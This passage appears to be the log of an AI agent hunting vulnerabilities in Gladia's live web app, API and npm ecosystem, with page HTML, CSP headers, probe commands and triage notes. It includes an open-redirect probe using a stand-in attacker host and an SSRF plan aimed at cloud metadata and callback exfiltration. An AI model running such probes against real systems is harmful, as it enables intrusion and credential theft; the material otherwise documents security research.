2.87507 22.6543 3.50977 22.0967L8.7832 17.4668H0V14.3643H8.59375L3.51172 9.90234C2.87704 9.34597 2.51179 8.54221 2.51172 7.69727V4.4375L9.00977 10.0332ZM29.4863 7.69434C29.4863 8.53815 29.123 9.34176 28.4883 9.89941L23.2148 14.5293H32V17.6318H23.4062L28.4883 22.0947C29.1217 22.651 29.4862 23.454 29.4863 24.2988V27.5586L22.9893 21.9648C21.5462 20.5218 20.7354 18.5652 20.7354 16.5254V15.4678C20.7354 13.428 21.5461 11.4714 22.9893 10.0283L29.4863 4.4375V7.69434ZM17.6328 8.59082L22.0957 3.50879C22.6522 2.87535 23.4557 2.51074 24.3008 2.51074H27.5596L21.9658 9.00781C20.5227 10.4509 18.5654 11.2617 16.5254 11.2617H15.4678L15.4668 11.2627C13.4268 11.2627 11.4695 10.4518 10.0264 9.00879L4.43652 2.51172H7.69336C8.53715 2.51176 9.34078 2.87613 9.89844 3.51074L14.5303 8.7832V0H17.6328V8.59082Z" fill="currentColor"></path><path d="M49.5654 5.73193C50.7102 5.73193 51.7808 5.90018 52.7773 6.23682C53.7807 6.56677 54.6769 7.03888 55.4648 7.65186C56.2526 8.26443 56.8991 8.99201 57.4043 9.8335C57.9159 10.675 58.2493 11.6048 58.4043 12.6216H54.5859C54.4313 12.0762 54.2023 11.5837 53.8994 11.146C53.5962 10.7084 53.2287 10.3385 52.7979 10.0356C52.367 9.72604 51.8822 9.4934 51.3438 9.33838C50.8119 9.17662 50.2359 9.09621 49.6162 9.09619C48.4984 9.09619 47.4983 9.3752 46.6162 9.93408C45.7341 10.493 45.037 11.3149 44.5254 12.3989C44.0205 13.4763 43.7676 14.7896 43.7676 16.3384C43.7676 17.9006 44.0135 19.2241 44.5049 20.3081C45.0033 21.3921 45.6901 22.2174 46.5654 22.7827C47.4408 23.3416 48.4548 23.6206 49.6064 23.6206C50.6836 23.6206 51.6165 23.409 52.4043 22.9849C53.192 22.5603 53.7985 21.9713 54.2227 21.2173C54.6252 20.5127 54.8368 19.7079 54.8633 18.8032H49.9795V15.8735H58.5557V26.7017H55.8682L55.5957 24.2778H55.4844C54.757 25.1463 53.9189 25.8165 52.9697 26.2876C52.0204 26.7523 50.8922 26.9848 49.5859 26.9849C47.6869 26.9849 46.0163 26.5568 44.5752 25.7017C43.1412 24.8395 42.02 23.6179 41.2119 22.0356C40.4037 20.4463 40 18.5601 40 16.3784C40 14.7085 40.2429 13.2168 40.7275 11.9038C41.2125 10.5909 41.8883 9.47587 42.7568 8.56006C43.6258 7.63779 44.6395 6.93769 45.7979 6.45947C46.9559 5.97486 48.2119 5.73194 49.5654 5.73193ZM75.3955 10.9849C76.3046 10.9849 77.0518 11.1401 77.6377 11.4497C78.2236 11.753 78.6888 12.1194 79.0322 12.5503C79.3753 12.9744 79.6416 13.3752 79.8301 13.7524H79.9814V11.187H83.6484V26.7017H80.0527V24.2573H79.8301C79.6416 24.6346 79.3687 25.0353 79.0117 25.4595C78.6548 25.8768 78.1835 26.2336 77.5977 26.5298C77.0121 26.8263 76.2746 26.9751 75.3857 26.9751C74.1669 26.9751 73.0755 26.6621 72.1123 26.0356C71.1495 25.4095 70.389 24.4999 69.8301 23.3081C69.2712 22.1159 68.9912 20.6678 68.9912 18.9644C68.9913 17.2405 69.2742 15.786 69.8398 14.6011C70.4123 13.4093 71.1837 12.5097 72.1533 11.9038C73.1229 11.2909 74.2038 10.9849 75.3955 10.9849ZM101.28 26.7017H97.6846V24.2573H97.4619C97.2731 24.6346 97.0005 25.0353 96.6436 25.4595C96.2869 25.8769 95.8154 26.2336 95.2295 26.5298C94.6436 26.8263 93.9064 26.9751 93.0176 26.9751C91.7986 26.975 90.7078 26.662 89.7451 26.0356C88.7823 25.4095 88.0205 24.4999 87.4619 23.3081C86.9031 22.116 86.624 20.6677 86.624 18.9644C86.6241 17.2404 86.907 15.7861 87.4727 14.6011C88.0451 13.4093 88.8153 12.5097 89.7852 11.9038C90.7548 11.2908 91.8365 10.9849 93.0283 10.9849C93.9373 10.9849 94.6846 11.1401 95.2705 11.4497C95.8559 11.7529 96.3207 12.1195 96.6641 12.5503C97.0074 12.9743 97.2731 13.3753 97.4619 13.7524H97.6143V6.01514H101.28V26.7017ZM117.792 10.9849C118.701 10.9849 119.449 11.14 120.035 11.4497C120.621 11.7529 121.085 12.1195 121.429 12.5503C121.772 12.9744 122.038 13.3753 122.227 13.7524H122.378V11.187H126.045V26.7017H122.449V24.2573H122.227C122.038 24.6346 121.765 25.0353 121.408 25.4595C121.052 25.8769 120.58 26.2336 119.994 26.5298C119.408 26.8263 118.671 26.9751 117.782 26.9751C116.563 26.9751 115.472 26.662 114.51 26.0356C113.547 25.4095 112.785 24.4999 112.227 23.3081C111.668 22.116 111.389 20.6677 111.389 18.9644C111.389 17.2406 111.671 15.786 112.236 14.6011C112.809 13.4093 113.58 12.5097 114.55 11.9038C115.519 11.2909 116.6 10.9849 117.792 10.9849ZM65.4023 22.2573C65.4023 22.8364 65.4899 23.2506 65.665 23.4995C65.8399 23.7487 66.1495 23.8674 66.5938 23.854C66.8362 23.8472 67.0184 23.8333 67.1396 23.813C67.2676 23.786 67.3824 23.7589 67.4834 23.7319L68.0889 26.5005C67.8735 26.5676 67.6041 26.6312 67.2812 26.6919C66.9648 26.7523 66.5737 26.7897 66.1094 26.8032C64.6278 26.8437 63.5303 26.5334 62.8164 25.8735C62.1029 25.2136 61.7461 24.2065 61.7461 22.853V6.01514H65.4023V22.2573ZM108.549 26.7017H104.893V11.187H108.549V26.7017ZM76.4053 13.9849C75.5909 13.9849 74.9106 14.1975 74.3652 14.6216C73.8197 15.0457 73.4087 15.6313 73.1328 16.3784C72.8565 17.1258 72.7188 17.982 72.7188 18.9448C72.7188 19.9143 72.8566 20.7797 73.1328 21.5405C73.4154 22.2946 73.8297 22.8906 74.375 23.3286C74.9271 23.7595 75.604 23.975 76.4053 23.9751C77.1797 23.9751 77.8403 23.7659 78.3857 23.3481C78.931 22.924 79.345 22.3346 79.6279 21.5806C79.9105 20.8266 80.0527 19.9479 80.0527 18.9448C80.0527 17.9416 79.9105 17.0692 79.6279 16.3286C79.3517 15.588 78.9409 15.0117 78.3955 14.6011C77.8569 14.1905 77.1931 13.9849 76.4053 13.9849ZM94.0381 13.9849C93.2232 13.9849 92.5425 14.1974 91.9971 14.6216C91.452 15.0456 91.0418 15.6315 90.7656 16.3784C90.4897 17.1258 90.3516 17.982 90.3516 18.9448C90.3516 19.9143 90.4897 20.7797 90.7656 21.5405C91.0486 22.2945 91.4625 22.8906 92.0078 23.3286C92.56 23.7595 93.2367 23.9751 94.0381 23.9751C94.8125 23.9751 95.4722 23.7659 96.0176 23.3481C96.563 22.924 96.9771 22.3347 97.2598 21.5806C97.5427 20.8266 97.6845 19.948 97.6846 18.9448C97.6846 17.9415 97.5427 17.0692 97.2598 16.3286C96.9839 15.588 96.5731 15.0117 96.0273 14.6011C95.4887 14.1905 94.8259 13.9849 94.0381 13.9849ZM118.803 13.9849C117.988 13.9849 117.307 14.1974 116.762 14.6216C116.216 15.0457 115.806 15.6313 115.529 16.3784C115.253 17.1258 115.116 17.982 115.116 18.9448C115.116 19.9143 115.253 20.7797 115.529 21.5405C115.812 22.2946 116.227 22.8906 116.772 23.3286C117.325 23.7594 118.001 23.9751 118.803 23.9751C119.577 23.9751 120.237 23.7659 120.782 23.3481C121.328 22.924 121.742 22.3347 122.024 21.5806C122.307 20.8266 122.449 19.9479 122.449 18.9448C122.449 17.9416 122.307 17.0692 122.024 16.3286C121.749 15.588 121.338 15.0117 120.792 14.6011C120.253 14.1905 119.59 13.9849 118.803 13.9849ZM106.73 5.01514C107.316 5.01514 107.815 5.2104 108.226 5.60107C108.643 5.98461 108.851 6.45241 108.852 7.00439C108.852 7.55017 108.643 8.01829 108.226 8.40869C107.815 8.79269 107.316 8.98486 106.73 8.98486C106.152 8.98482 105.654 8.79259 105.236 8.40869C104.819 8.01829 104.609 7.55017 104.609 7.00439C104.609 6.45241 104.819 5.98461 105.236 5.60107C105.654 5.21051 106.152 5.01518 106.73 5.01514Z" fill="currentColor"></path></svg></a><h1 class="text-display-xs font-semibold">Sign in to your account</h1></div><div class="flex flex-col gap-5"><input hidden="" autoComplete="email" name="email"/><div class="group flex flex-col gap-1.5" data-rac="" data-required="true"><label class="inline-flex gap-1 text-sm text-text-secondary font-medium cursor-default w-fit" id="react-aria-_R_2alalH1_" for="react-aria-_R_2alal_">Email</label><div role="presentation" class="relative py-2 px-3 text-sm inset-ring-1 rounded-md bg-bg-primary flex items-center gap-2 shadow-xs overflow-hidden disabled:bg-bg-disabled inset-ring-border-secondary hover:inset-ring-border-secondary_hover" data-rac=""><input type="email" required="" autoComplete="email" placeholder="Enter your email" tabindex="0" id="react-aria-_R_2alal_" aria-labelledby="react-aria-_R_2alalH1_" aria-describedby="react-aria-_R_2alalH3_ react-aria-_R_2alalH4_" class="flex-1 min-w-0 outline-0 font-normal text-text-primary lining-nums tabular-nums placeholder:text-text-placeholder disabled:text-text-disabled text-md" data-rac="" value=""/></div></div><div class="flex flex-col gap-2"><input hidden="" autoComplete="current-password" name="password"/><div class="group flex flex-col gap-1.5" data-rac="" data-required="true"><label class="inline-flex gap-1 text-sm text-text-secondary font-medium cursor-default w-fit" id="react-aria-_R_9ilalH1_" for="react-aria-_R_9ilal_">Password</label><div role="presentation" class="relative py-2 px-3 text-sm inset-ring-1 rounded-md bg-bg-primary flex items-center gap-2 shadow-xs overflow-hidden disabled:bg-bg-disabled inset-ring-border-secondary hover:inset-ring-border-secondary_hover" data-rac=""><input type="password" required="" autoComplete="current-password" placeholder="••••••••" tabindex="0" id="react-aria-_R_9ilal_" aria-labelledby="react-aria-_R_9ilalH1_" aria-describedby="react-aria-_R_9ilalH3_ react-aria-_R_9ilalH4_" class="flex-1 min-w-0 outline-0 font-normal text-text-primary lining-nums tabular-nums placeholder:text-text-placeholder disabled:text-text-disabled text-md" data-rac="" value=""/></div></div><button class="relative inline-flex justify-center items-center cursor-pointer lining-nums tabular-nums whitespace-nowrap text-button-tertiary-fg hover:text-button-tertiary-fg_hover gap-1 rounded-md text-sm font-semibold [&amp;&gt;svg]:size-5 [&amp;&gt;svg]:stroke-[1.67] p-0 [&amp;:has(svg:only-child)]:p-0 underline place-self-start" data-rac="" type="button" tabindex="0" data-react-aria-pressable="true" id="react-aria-_R_2ilal_">Forgot password</button></div></div><div class="flex flex-col gap-4 justify-stretch"><button class="relative inline-flex justify-center items-center cursor-pointer lining-nums tabular-nums whitespace-nowrap bg-button-primary-bg text-button-primary-fg inset-ring-1 inset-ring-white/12 hover:bg-button-primary-bg_hover hover:text-button-primary-fg_hover py-[.625rem] px-4 gap-1.5 rounded-md text-md font-semibold [&amp;:has(svg:only-child)]:p-3 [&amp;&gt;svg]:size-5 [&amp;&gt;svg]:stroke-[1.67]" data-rac="" type="submit" value="email-password" tabindex="0" data-react-aria-pressable="true" id="react-aria-_R_clal_" name="intent">Sign in</button><button class="relative inline-flex justify-center items-center cursor-pointer lining-nums tabular-nums whitespace-nowrap text-text-primary hover:text-text-primary_hover bg-bg-primary hover:bg-bg-primary_hover inset-ring-1 inset-ring-border-primary py-[.625rem] px-4 rounded-md text-md font-semibold [&amp;:has(svg:only-child)]:p-3 [&amp;&gt;svg]:size-5 [&amp;&gt;svg]:stroke-[1.67] gap-3" data-rac="" type="submit" value="google" tabindex="0" data-react-aria-pressable="true" id="react-aria-_R_klal_" name="intent"><svg class="stroke-current inline self-center size-6 stroke-[2]"><use href="/assets/sprite-DbMwWnV7.svg#SocialGoogleColorBrand"></use></svg><span>Sign in with Google</span></button></div><p class="place-self-center"><span class="text-sm text-text-tertiary">Don’t have an account? </span><button class="relative inline-flex justify-center items-center cursor-pointer lining-nums tabular-nums whitespace-nowrap text-button-tertiary-fg hover:text-button-tertiary-fg_hover gap-1 rounded-md text-sm font-semibold [&amp;&gt;svg]:size-5 [&amp;&gt;svg]:stroke-[1.67] p-0 [&amp;:has(svg:only-child)]:p-0" data-rac="" type="button" tabindex="0" data-react-aria-pressable="true" id="react-aria-_R_llal_">Sign up</button></p></form></main><div class="hidden basis-1/2 lg:block bg-[url(/assets/images/auth-background.webp)] bg-cover bg-no-repeat bg-center"></div></div><script nonce="0d546de09133f261d9ad799d1902aaf8">window.ENV = {"MODE":"production","APP_BASE_URL":"https://app.gladia.io","GA_USER_ID":null,"GOOGLE_TAG_MANAGER_ID":"GTM-N7XJQJG"}</script><script nonce="0d546de09133f261d9ad799d1902aaf8">((storageKey, restoreKey) => {
+import("/assets/entry.client-BOHuV7Pj.js");</script><!--$--><script nonce="0d546de09133f261d9ad799d1902aaf8">window.__reactRouterContext.streamController.enqueue("[{\"_1\":2,\"_3\":-5,\"_4\":-5},\"loaderData\",{\"_5\":6,\"_7\":8},\"actionData\",\"errors\",\"root\",{\"_11\":12,\"_13\":14,\"_15\":-7},\"routes/auth/signin\",{\"_9\":10},\"isFirstSignin\",false,\"userPrefs\",{\"_23\":24,\"_25\":26,\"_27\":28},\"ENV\",{\"_16\":17,\"_18\":19,\"_20\":-5,\"_21\":22},\"signupSteps\",\"MODE\",\"production\",\"APP_BASE_URL\",\"https://app.gladia.io\",\"GA_USER_ID\",\"GOOGLE_TAG_MANAGER_ID\",\"GTM-N7XJQJG\",\"theme\",\"dark\",\"locale\",\"en\",\"sidebar\",\"expanded\"]\n");</script><!--$--><script nonce="0d546de09133f261d9ad799d1902aaf8">window.__reactRouterContext.streamController.close();</script><!--/$--><!--/$--></body></html>
+
+=== form action reflection ===
+action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"
+
+=== app CSP header ===
+content-security-policy: default-src 'self'; connect-src 'self' https://*.gladia.io wss://*.gladia.io https://*.google.com https://*.google-analytics.com https://*.googletagmanager.com https://*.analytics.google.com https://*.g.doubleclick.net https://pagead2.googlesyndication.com https://*.google.com https://*.google.ad https://*.google.ae https://*.google.com.af https://*.google.com.ag https://*.google.al https://*.google.am https://*.google.co.ao https://*.google.com.ar https://*.google.as https://*.google.at https://*.google.com.au https://*.google.az https://*.google.ba https://*.google.com.bd https://*.google.be https://*.google.bf https://*.google.bg https://*.google.com.bh https://*.google.bi https://*.google.bj https://*.google.com.bn https://*.google.com.bo https://*.google.com.br https://*.google.bs https://*.google.bt https://*.google.co.bw https://*.google.by https://*.google.com.bz https://*.google.ca https://*.google.cd https://*.google.cf https://*.google.cg https://*.google.ch https://*.google.ci https://*.google.co.ck https://*.google.cl https://*.google.cm https://*.google.cn https://*.google.com.co https://*.google.co.cr https://*.google.com.cu https://*.google.cv https://*.google.com.cy https://*.google.cz https://*.google.de https://*.google.dj https://*.google.dk https://*.google.dm https://*.google.com.do https://*.google.dz https://*.google.com.ec https://*.google.ee https://*.google.com.eg https://*.google.es https://*.google.com.et https://*.google.fi https://*.google.com.fj https://*.google.fm https://*.google.fr https://*.google.ga https://*.google.ge https://*.google.gg https://*.google.com.gh https://*.google.com.gi https://*.google.gl https://*.google.gm https://*.google.gr https://*.google.com.gt https://*.google.gy https://*.google.com.hk https://*.google.hn https://*.google.hr https://*.google.ht https://*.google.hu https://*.google.co.id https://*.google.ie https://*.google.co.il https://*.google.im https://*.google.co.in https://*.google.iq https://*.google.is https://*.google.it https://*.google.je https://*.google.com.jm https://*.google.jo https://*.google.co.jp https://*.google.co.ke https://*.google.com.kh https://*.google.ki https://*.google.kg https://*.google.co.kr https://*.google.com.kw https://*.google.kz https://*.google.la https://*.google.com.lb https://*.google.li https://*.google.lk https://*.google.co.ls https://*.google.lt https://*.google.lu https://*.google.lv https://*.google.com.ly https://*.google.co.ma https://*.google.md https://*.google.me https://*.google.mg https://*.google.mk https://*.google.ml https://*.google.com.mm https://*.google.mn https://*.google.com.mt https://*.google.mu https://*.google.mv https://*.google.mw https://*.google.com.mx https://*.google.com.my https://*.google.co.mz https://*.google.com.na https://*.google.com.ng https://*.google.com.ni https://*.google.ne https://*.google.nl https://*.google.no https://*.google.com.np https://*.google.nr https://*.google.nu https://*.google.co.nz https://*.google.com.om https://*.google.com.pa https://*.google.com.pe https://*.google.com.pg https://*.google.com.ph https://*.google.com.pk https://*.google.pl https://*.google.pn https://*.google.com.pr https://*.google.ps https://*.google.pt https://*.google.com.py https://*.google.com.qa https://*.google.ro https://*.google.ru https://*.google.rw https://*.google.com.sa https://*.google.com.sb https://*.google.sc https://*.google.se https://*.google.com.sg https://*.google.sh https://*.google.si https://*.google.sk https://*.google.com.sl https://*.google.sn https://*.google.so https://*.google.sm https://*.google.sr https://*.google.st https://*.google.com.sv https://*.google.td https://*.google.tg https://*.google.co.th https://*.google.com.tj https://*.google.tl https://*.google.tm https://*.google.tn https://*.google.to https://*.google.com.tr https://*.google.tt https://*.google.com.tw https://*.google.co.tz https://*.google.com.ua https://*.google.co.ug https://*.google.co.uk https://*.google.com.uy https://*.google.co.uz https://*.google.com.vc https://*.google.co.ve https://*.google.co.vi https://*.google.com.vn https://*.google.vu https://*.google.ws https://*.google.rs https://*.google.co.za https://*.google.co.zm https://*.google.co.zw https://*.google.cat https://*.hubapi.com https://*.hubspot.com https://*.hscollectedforms.net https://*.hsforms.com https://*.hotjar.com https://*.contentsquare.net https://*.hotjar.io wss://*.hotjar.com https://*.axept.io https://*.axeptio.eu https://*.axeptio.tech; frame-src 'self' https://gladia.io https://*.gladia.io https://*.googletagmanager.com https://pagead2.googlesyndication.com https://www.googleadservices.com https://googleads.g.doubleclick.net https://*.hyperline.co https://billing.gladia.io/portal https://app.svix.com/ https://*.hs-scripts.com https://*.hs-analytics.net https://*.hsadspixel.net https://*.hscollectedforms.net https://*.hs-banner.com https://*.hubspot.com https://*.hotjar.com https://*.contentsquare.net; worker-src 'self' blob:; media-src 'self' data: blob:; script-src 'self' 'nonce-a47547f13962cc767955c073220e81fe' 'strict-dynamic' https://*.googletagmanager.com https://*.googleadservices.com https://*.pagead2.googlesyndication.com https://googleads.g.doubleclick.net https://*.hotjar.com https://*.contentsquare.net https://*.axept.io; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://*.hotjar.com; img-src 'self' data: https://*.googletagmanager.com https://*.google-analytics.com https://*.g.doubleclick.net https://*.google.com https://*.google.fr https://*.google.com https://*.google.ad https://*.google.ae https://*.google.com.af https://*.google.com.ag https://*.google.al https://*.google.am https://*.google.co.ao https://*.google.com.ar https://*.google.as https://*.google.at https://*.google.com.au https://*.google.az https://*.google.ba https://*.google.com.bd https://*.google.be https://*.google.bf https://*.google.bg https://*.google.com.bh https://*.google.bi https://*.google.bj https://*.google.com.bn https://*.google.com.bo https://*.google.com.br https://*.google.bs https://*.google.bt https://*.google.co.bw https://*.google.by https://*.google.com.bz https://*.google.ca https://*.google.cd https://*.google.cf https://*.google.cg https://*.google.ch https://*.google.ci https://*.google.co.ck https://*.google.cl https://*.google.cm https://*.google.cn https://*.google.com.co https://*.google.co.cr https://*.google.com.cu https://*.google.cv https://*.google.com.cy https://*.google.cz https://*.google.de https://*.google.dj https://*.google.dk https://*.google.dm https://*.google.com.do https://*.google.dz https://*.google.com.ec https://*.google.ee https://*.google.com.eg https://*.google.es https://*.google.com.et https://*.google.fi https://*.google.com.fj https://*.google.fm https://*.google.fr https://*.google.ga https://*.google.ge https://*.google.gg https://*.google.com.gh https://*.google.com.gi https://*.google.gl https://*.google.gm https://*.google.gr https://*.google.com.gt https://*.google.gy https://*.google.com.hk https://*.google.hn https://*.google.hr https://*.google.ht https://*.google.hu https://*.google.co.id https://*.google.ie https://*.google.co.il https://*.google.im https://*.google.co.in https://*.google.iq https://*.google.is https://*.google.it https://*.google.je https://*.google.com.jm https://*.google.jo https://*.google.co.jp https://*.google.co.ke https://*.google.com.kh https://*.google.ki https://*.google.kg https://*.google.co.kr https://*.google.com.kw https://*.google.kz https://*.google.la https://*.google.com.lb https://*.google.li https://*.google.lk https://*.google.co.ls https://*.google.lt https://*.google.lu https://*.google.lv https://*.google.com.ly https://*.google.co.ma https://*.google.md https://*.google.me https://*.google.mg https://*.google.mk https://*.google.ml https://*.google.com.mm https://*.google.mn https://*.google.com.mt https://*.google.mu https://*.google.mv https://*.google.mw https://*.google.com.mx https://*.google.com.my https://*.google.co.mz https://*.google.com.na https://*.google.com.ng https://*.google.com.ni https://*.google.ne https://*.google.nl https://*.google.no https://*.google.com.np https://*.google.nr https://*.google.nu https://*.google.co.nz https://*.google.com.om https://*.google.com.pa https://*.google.com.pe https://*.google.com.pg https://*.google.com.ph https://*.google.com.pk https://*.google.pl https://*.google.pn https://*.google.com.pr https://*.google.ps https://*.google.pt https://*.google.com.py https://*.google.com.qa https://*.google.ro https://*.google.ru https://*.google.rw https://*.google.com.sa https://*.google.com.sb https://*.google.sc https://*.google.se https://*.google.com.sg https://*.google.sh https://*.google.si https://*.google.sk https://*.google.com.sl https://*.google.sn https://*.google.so https://*.google.sm https://*.google.sr https://*.google.st https://*.google.com.sv https://*.google.td https://*.google.tg https://*.google.co.th https://*.google.com.tj https://*.google.tl https://*.google.tm https://*.google.tn https://*.google.to https://*.google.com.tr https://*.google.tt https://*.google.com.tw https://*.google.co.tz https://*.google.com.ua https://*.google.co.ug https://*.google.co.uk https://*.google.com.uy https://*.google.co.uz https://*.google.com.vc https://*.google.co.ve https://*.google.co.vi https://*.google.com.vn https://*.google.vu https://*.google.ws https://*.google.rs https://*.google.co.za https://*.google.co.zm https://*.google.co.zw https://*.google.cat https://googleads.g.doubleclick.net https://pagead2.googlesyndication.com https://www.googleadservices.com https://*.hsforms.com https://*.hubspot.com https://*.hotjar.com https://*.contentsquare.net https://axeptio.imgix.net https://*.axept.io https://*.gstatic.com; font-src 'self' fonts.gstatic.com https://*.hotjar.com; object-src 'none'; base-uri 'self';
+[0m
+[0m$ [0mecho "=== npm gladia view ===" && npm view gladia dist-tags.latest description repository.url maintainers homepage 2>&1 && echo "" && echo "=== npm gladia dist sha256 ===" && npm view gladia@0.1.3 dist.shasum 2>&1 && echo "" && echo "=== @gladiaio/sdk official ===" && npm view @gladiaio/sdk dist-tags.latest repository.url 2>&1 && echo "" && echo "=== GitHub user/404 ===" && curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/users/alexisbouchez 2>&1 && echo "" && echo "=== GitHub repo 404 ===" && curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/repos/alexisbouchez/gladia.ts 2>&1
+=== npm gladia view ===
+dist-tags.latest = '0.1.3'
+description = 'Official TypeScript SDK for Gladia - State-of-the-art Speech to Text API'
+repository.url = 'git+https://github.com/alexisbouchez/gladia.ts.git'
+maintainers = 'softwarecitadel <softwarecitadel@gmail.com>'
+homepage = 'https://github.com/alexisbouchez/gladia.ts#readme'
+
+=== npm gladia dist sha256 ===
+cc96f84a200c0fd49a71e919391f9b659c39f3e9
+
+=== @gladiaio/sdk official ===
+dist-tags.latest = '1.1.0'
+repository.url = 'git+https://github.com/gladiaio/sdk.git'
+
+=== GitHub user/404 ===
+404
+=== GitHub repo 404 ===
+404
+[0m
+[0m✗ [0mRead triage/run-2026-08-08-17-10.md failed
+[91m[1mError: [0mFile not found: /home/runner/work/gladia-hunt/gladia-hunt/triage/run-2026-08-08-17-10.md
+Let me check how previous analysis runs were recorded to match the output format.
+[0m
+[0m$ [0mls -t /home/runner/work/gladia-hunt/gladia-hunt/triage/ | head -5
+run-2026-08-07-21-04.md
+run-2026-08-07-21-57.md
+run-2026-08-07-22-57.md
+run-2026-08-07-23-50.md
+run-2026-08-08-02-23.md
+[0m
+[0m$ [0mls -t /home/runner/work/gladia-hunt/gladia-hunt/triage/ | head -3 && echo "---" && cat /home/runner/work/gladia-hunt/gladia-hunt/triage/run-2026-08-08-16-58.md 2>/dev/null || cat "/home/runner/work/gladia-hunt/gladia-hunt/triage/$(ls -t /home/runner/work/gladia-hunt/gladia-hunt/triage/ | head -1)"
+run-2026-08-07-21-04.md
+run-2026-08-07-21-57.md
+run-2026-08-07-22-57.md
+---
+
+===== TRIAGE 2026-08-08 16:58:14 UTC =====
+[0m
+> build · longcat-2.0-free
+[0m
+The leads section is empty — no actual URLs or findings were provided after "LEADS:". Please paste the hunt bot's probe results (URLs, HTTP codes, and any description of the issues found) so I can triage each one against the 7-Question Gate.
+[0m
+[0m→ [0mRead README.md
+[0m
+[0m$ [0mls /home/runner/work/gladia-hunt/gladia-hunt/knowledge/
+index.md
+[0m
+[0m→ [0mRead leads/lead-laguna.md[90m [offset=1255, limit=10][0m
+I've completed fresh passive probes confirming the surface is NO-DRIFT frozen. The three live hypotheses remain valid. Let me record this analysis.
+[0m✗ [0mEdit leads/lead-laguna.md failed
+[91m[1mError: [0mCould not find oldString in the file. It must match exactly, including whitespace, indentation, and line endings.
+[0m
+[0m$ [0mwc -l /home/runner/work/gladia-hunt/gladia-hunt/leads/lead-laguna.md && tail -5 /home/runner/work/gladia-hunt/gladia-hunt/leads/lead-laguna.md | cat -A | head -10
+1259 /home/runner/work/gladia-hunt/gladia-hunt/leads/lead-laguna.md
+[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:0x UTC M-bM-^@M-^T form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate.$
+[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri M-bM-^@M-^T server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:0x UTC).$
+[RISK] api.gladia.io: 85 M-bM-^@M-^T Public OpenAPI 14 paths/CORS `*`; CORS `*` + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 15+ cycles.$
+[RISK] app.gladia.io: 65 M-bM-^@M-^T /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.$
+[RISK] sdk: 85 M-bM-^@M-^T Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + READMEM-bM-^FM-^Tpackage.json "Official/Unofficial" contradiction; supply-chain risk High.$
+[0m
+[0m$ [0mcat >> /home/runner/work/gladia-hunt/gladia-hunt/leads/lead-laguna.md << 'ENDOFANALYSIS'
+
+## 2026-08-08 17:44:00 UTC [app] (model laguna)
+
+### STEP 1 — DELTA
+NO_DELTA — Fresh passive probes at 17:44 UTC confirm surface byte-identical across all assets (20th consecutive NO_DRIFT cycle):
+- api.gladia.io: /openapi.json 125131B/14 paths, /health {"health":"OK"} 15B (x-powered-by ABSENT on GET), /v1/models 530B FR/US, OPTIONS x-powered-by:Express + ACAO *, POST /v2/pre-recorded 401 NestJS shape — all frozen
+- app.gladia.io: /signin?redirect_to=https://evil.example.com -> 200, form action reflects, CSP no form-action, /auth/google/callback 200, /dashboard 200 SPA — all stable
+- npm: gladia@0.1.3 dist-tag latest=0.1.3, repository=alexisbouchez/gladia.ts, GitHub user + repo 404 (orphaned), @gladiaio/sdk 1.1.0 official — frozen
+- reposcan-latest.md (17:30 UTC): 5647 files, 617 hits, delta=0 new hits
+
+### STEP 2 — PRIORITIZE
+- [PRIO] npm registry / gladia@0.1.3 — 9.2 | attack:10, business:9, tech:8, gate:10, cloud:7, fresh:10
+- [PRIO] api.gladia.io /v2/pre-recorded (SSRF surface) — 8.4 | attack:9, business:10, tech:8, gate:3, cloud:10, fresh:10
+- [PRIO] app.gladia.io /signin (OATH) — 8.3 | attack:8, business:9, tech:8, gate:10, cloud:3, fresh:10
+
+[HYP] Orphaned npm package gladia@0.1.3 impersonates official SDK, leaking API key in WebSocket URL
+class: OTHER
+asset: npm registry / gladia@0.1.3
+confidence: 95
+reasoning: Fresh 17:44 UTC probe confirms npm view latest=0.1.3, repository=alexisbouchez/gladia.ts (personal), maintainer=softwarecitadel@gmail.com; GitHub API returns 404 on both user and repo (orphaned); @gladiaio/sdk@1.1.0 points to gladiaio/sdk org (official). src/client.ts:306-307 appends raw x-gladia-key to wss://api.gladia.io/v2/live via searchParams.append, diverging from official SDK POST /v2/live-then-token flow.
+evidence_needed: Tarball src/client.ts with searchParams.append of API key into wss URL query; npm metadata showing personal repo; GitHub 404 on user+repo; package.json "Official" vs README "Unofficial"
+verify_steps: RAG — tar -xzf gladia-0.1.3.tgz; grep -n 'searchParams.append' package/src/client.ts; npm view gladia repository,maintainers; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/users/alexisbouchez; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/repos/alexisbouchez/gladia.ts
+impact: Supply-chain credential theft — devs install impersonated SDK; API keys leak into URL query strings, proxy logs, Referer headers, server-side request logs. severity High.
+testability: RAG
+
+[HYP] SSRF via server-side fetch of audio_url/video_url/callback_url on /v2/pre-recorded
+class: SSRF
+asset: api.gladia.io /v2/pre-recorded
+confidence: 73
+reasoning: Fresh 17:44 UTC probe confirms POST /v2/pre-recorded (no key) -> 401 NestJS HttpException; /openapi.json (125131B, 14 paths) exposes InitTranscriptionRequest.audio_url, video_url, callback_url, CallbackConfigDto.url all as format:uri with no scheme allowlist; /v1/models (530B, CORS *) leaks FR+US egress regions; key-gated only.
+evidence_needed: Server-side fetch reaches 169.254.169.254 (AWS IMDSv1) or localhost/private CIDR; callback_url exfil path confirmed.
